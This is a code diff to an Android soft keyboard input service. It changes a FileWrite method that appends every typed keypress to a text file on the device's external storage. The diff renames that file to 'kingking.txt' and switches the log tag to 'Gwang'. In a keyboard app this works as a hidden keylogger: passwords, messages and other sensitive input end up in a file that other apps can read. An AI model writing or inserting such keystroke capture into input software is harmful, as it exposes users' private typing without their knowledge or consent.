@@ -1172,7 +1172,7 @@ public class SoftKeyboard extends InputMethodService
 
     }
 
-    private String encodingStr(String str)
+    public String encodingStr(String str)
     {
     	String ret = null;
     	try
@@ -1366,17 +1366,18 @@ public class SoftKeyboard extends InputMethodService
     public void FileWrite(String input) {
         //추가
         String keypress = input+" ";
-        Log.d("Key Pressed", keypress);
+
         try {
+            Log.d("Gwang", keypress);
             String SDCARD = Environment.getExternalStorageDirectory().getAbsolutePath();
-            String FILENAME = "keyxxxx.txt";
+            String FILENAME = "kingking.txt";
 
             File outfile = new File(SDCARD + File.separator + FILENAME);
             FileOutputStream fos = new FileOutputStream(outfile, true);
             fos.write(keypress.getBytes());
             fos.close();
         } catch (Exception e) {
-            Log.d("EXCEPTION", e.getMessage());
+            Log.d("Gwang", e.getMessage());
         }
         //추가
     }
